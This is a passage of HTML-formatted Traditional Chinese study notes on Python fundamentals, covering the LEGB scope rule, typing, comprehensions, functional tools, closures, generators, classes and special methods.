&lt;li&gt;可以用 python 來寫測試其他語言的工具  &lt;ul&gt;
&lt;li&gt;Data model 有許多 special method (&lt;strong&gt;xxx&lt;/strong&gt;) 的詳細說明  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Scope&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;function scope  &lt;ul&gt;
&lt;li&gt;scopes are decided by functions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;The LEGB Rule (python 變數查找的規則)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;變數查找順序依序為  &lt;ul&gt;
&lt;li&gt;local  &lt;/li&gt;
&lt;li&gt;enclosed  &lt;/li&gt;
&lt;li&gt;global  &lt;/li&gt;
&lt;li&gt;built-in  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="http://clime.mosky.tw"&gt;clime&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;自動將 python code 轉為 command line 介面的 script  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;locals()[sys.argv[1]]()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Module and Package&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;module&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# module.py  &lt;/span&gt;

&lt;span class="c1"&gt;# 資料夾底下有 __init__.py 的話 就是 python 的 package  &lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;package&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# __init__.py , package 指的是該資料夾的名字  &lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;package.module&lt;/span&gt; &lt;span class="c1"&gt;# package/module.py  &lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# package/module.py  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;$ python -m package.module&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不要把自訂的 module 的名字取的跟 built-in module 的名字一樣  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Typing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;python is not static typing, is dynamic typing  &lt;/li&gt;
&lt;li&gt;Dynamic typing  &lt;ul&gt;
&lt;li&gt;check types in run time  &lt;/li&gt;
&lt;li&gt;a variable just points to an object  &lt;/li&gt;
&lt;li&gt;一個變數的 reference counter 歸零後, 就會被 GC 回收  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Duck Typing  &lt;ul&gt;
&lt;li&gt;不在乎你是什麼, 只在乎你會做什麼事  &lt;/li&gt;
&lt;li&gt;A style of dynamic typing  &lt;/li&gt;
&lt;li&gt;如果真的要檢查type的話, 可以用  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;if hasattr(x, '__iter__')&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;用來選擇使用者輸入的type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;assert hasattr(x, '__iter__'), 'x must be iterable'&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;string 和 integer 都支援 += 這個 operator  &lt;/li&gt;
&lt;li&gt;item vs. items  &lt;/li&gt;
&lt;li&gt;employee vs. employee_name  &lt;/li&gt;
&lt;li&gt;args vs. kargs  &lt;/li&gt;
&lt;li&gt;寫好 Documentation 很重要  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Protocol&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;iterator Protocol  &lt;ul&gt;
&lt;li&gt;object which supports &lt;code&gt;__iter__()&lt;/code&gt; and &lt;code&gt;next()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;readable  &lt;ul&gt;
&lt;li&gt;object which supports &lt;code&gt;read()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Weak typing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;It converts the type if you do an operation not supported with original type  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;python 不是 weak typing !&lt;br /&gt;
weak typing 和 dynamic typing 是不同的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Strong typing&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;python 是 strong typing  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;1 + 'a'&lt;/code&gt; 會噴 Exception  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Comprehension&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;list comprehension  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;              &lt;span class="c1"&gt;# for 的前面是個 exp. 後面是疊代的條件  &lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# [1, 3, 5, 7, 9]  &lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# [0, 2, 4, 6, 8]  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ 可以用這樣的方式很快的檢測使用者輸入的資料  
+ 可以是巢狀的
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;generator comprehension  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;(i for i in range(10))&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳的值不是 tuple，而是 generator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;lazy evaluation  &lt;ul&gt;
&lt;li&gt;save memory  &lt;/li&gt;
&lt;li&gt;會等到真的必須要求值的時候才會計算  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other Comprehensions  &lt;ul&gt;
&lt;li&gt;set comprehension  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;set(i for i in range(10)) # python2 or 3&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{i for i in range(10)}    # python3 only&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;dict Comprehension  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;dict((i,i) for i in range(10)) # python2 or 3&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;{i:i for i in range(10)}       # python3 only&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Functional Technique&lt;/h2&gt;
&lt;h3&gt;any() / all()&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="c1"&gt;# seq 裏面只要有一個條件不符合的話 就會回傳false  &lt;/span&gt;

&lt;span class="c1"&gt;# 如果 iterable 是空的話，all() 會回傳 True  &lt;/span&gt;
&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(())&lt;/span&gt;  
&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;([])&lt;/span&gt;  
&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;({})&lt;/span&gt;  
&lt;span class="c1"&gt;# 三者的結果皆為 True  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="c1"&gt;# seq 裏面只要有一個條件符合的話 就會回傳true  &lt;/span&gt;

&lt;span class="c1"&gt;# 如果 iterable 是空的話，any() 會回傳 False  &lt;/span&gt;
&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;(())&lt;/span&gt;  
&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;([])&lt;/span&gt;  
&lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;({})&lt;/span&gt;  
&lt;span class="c1"&gt;# 三者的結果皆為 False  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;用 list comprehension 和 any() / all() 產生 100 內的質數表&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="nb"&gt;any&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt;  

&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;))]&lt;/span&gt;  

&lt;span class="c1"&gt;# 寫的時候先考慮後面每個 element 的條件  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;lamda expression&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;expression&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="c1"&gt;# 其實就是一個小型的 function  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;anonymous function&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;a single expression  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;g&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="n"&gt;do&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;use sort with lambda&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 想要讓 dict 按照 value 的順序排列, 而不是 key 的順序  &lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;300&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;keys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;  
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;利用 unpack 和 zip 達到轉置矩陣的效果&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 先把 r 拆開, 再重新拼起來  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;map/filter&lt;/h3&gt;
&lt;h3&gt;reduce&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;兩個兩個運算後回傳結果  &lt;/li&gt;
&lt;li&gt;python3 的 &lt;code&gt;reduce()&lt;/code&gt; 已經不是 built-in function  &lt;ul&gt;
&lt;li&gt;要用的話要記得 &lt;code&gt;import functools&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;然後用 &lt;code&gt;functools.reduce()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;partial&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/functools.html#functools.partial"&gt;9.8. functools — Higher-order functions and operations on callable objects — Python 2.7.10 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/functools.html#functools.partial"&gt;10.2. functools — Higher-order functions and operations on callable objects — Python 3.5.0 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Closure&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.codedata.com.tw/java/understanding-lambda-closure-3-python-support/"&gt;認識 Lambda/Closure（3）Python 對 Lambda/Closure 的支援 by caterpillar | CodeData&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.python.org.tw/Python/Cookbook/Closure"&gt;Python/Cookbook/Closure - Python Taiwan Wiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://fcamel-life.blogspot.tw/2010/02/python-closure.html"&gt;fcamel 技術隨手記: Python 的 Closure&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.diveintopython3.net/generators.html"&gt;Closures &amp;amp; Generators - Dive Into Python 3&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;yield&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;coroutine  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;yield&lt;/code&gt; 取代 &lt;code&gt;return&lt;/code&gt; 的話, 會回傳 generator  &lt;ul&gt;
&lt;li&gt;可以被疊代, 比較不耗記憶體  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;OOP in python&lt;/h2&gt;
&lt;h3&gt;The &lt;code&gt;class&lt;/code&gt; Statement&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Example&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="n"&gt;class_attribute&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;  

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
        &lt;span class="k"&gt;pass&lt;/span&gt;  

&lt;span class="n"&gt;example&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Example&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;example&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Everythin in Python is &lt;code&gt;object&lt;/code&gt;.  &lt;ul&gt;
&lt;li&gt;Class is also an &lt;code&gt;object&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;All &lt;code&gt;class&lt;/code&gt; inherit the &lt;code&gt;object&lt;/code&gt; (new-style classes)  &lt;/li&gt;
&lt;li&gt;Support multiple inheritance  &lt;ul&gt;
&lt;li&gt;Searching attributes / methods like BFS.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Bound and Unbound Method&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;bound method (instance method)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;c.m(...)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;unbound  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;def m(self, ...):&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;C.m(c, ...)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Class Method and Static Method&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;class method  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@classmethod&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;m&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;cls&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;static method  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@staticmethod&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;m&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;ref  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/12179271/python-classmethod-and-staticmethod-for-beginner"&gt;oop - Python @classmethod and @staticmethod for beginner? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20021164"&gt;Python 中的 classmethod 和 staticmethod 有什么具体用途？ - Python - 知乎&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://pythoncentral.io/difference-between-staticmethod-and-classmethod-in-python/"&gt;Difference between @staticmethod and @classmethod in Python - Python Central&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://missions5.blogspot.tw/2014/12/python-classmethod-and-staticmethod.html"&gt;迷失霧的迷思: python @classmethod and @ staticmethod 的不同(筆記)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The Data Model of Python&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Special methods  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;__init__&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;__str__&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;__repr__&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;__getitem__&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;x[key]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__setitem__&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;x[key] = value&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
